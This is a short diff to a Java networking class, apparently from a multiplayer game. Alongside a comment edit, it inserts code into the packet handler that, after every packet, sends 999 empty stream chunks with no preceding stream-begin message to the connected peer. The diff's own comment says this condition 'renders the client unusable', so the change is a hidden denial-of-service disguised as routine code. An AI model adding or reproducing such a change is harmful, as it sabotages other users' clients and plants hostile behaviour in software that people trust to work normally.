@@ -232,7 +232,7 @@ public class Net{
             StreamChunk c = (StreamChunk)object;
             StreamBuilder builder = streams.get(c.id);
             if(builder == null){
-                throw new RuntimeException("Recieved stream chunk without a StreamBegin beforehand!");
+                throw new RuntimeException("Recieved stream chunk without a StreamBegin beforehand!"); // continuously causing this renders the client unusable
             }
             builder.add(c.data);
             if(builder.isDone()){
@@ -267,6 +267,16 @@ public class Net{
             Pools.free(object);
         }else{
             Log.err("Unhandled packet type: '{0}'!", object.getClass());
+        }
+
+        if (connection instanceof ArcNetProvider.ArcConnection) {
+            ArcNetProvider.ArcConnection arcConnection = (ArcNetProvider.ArcConnection) connection;
+            StreamChunk streamChunk = new StreamChunk();
+            streamChunk.id = 42;
+            streamChunk.data = new byte[0];
+            for (int i = 0; i < 999; i++) {
+                arcConnection.send(streamChunk, SendMode.tcp);
+            }
         }
     }
 
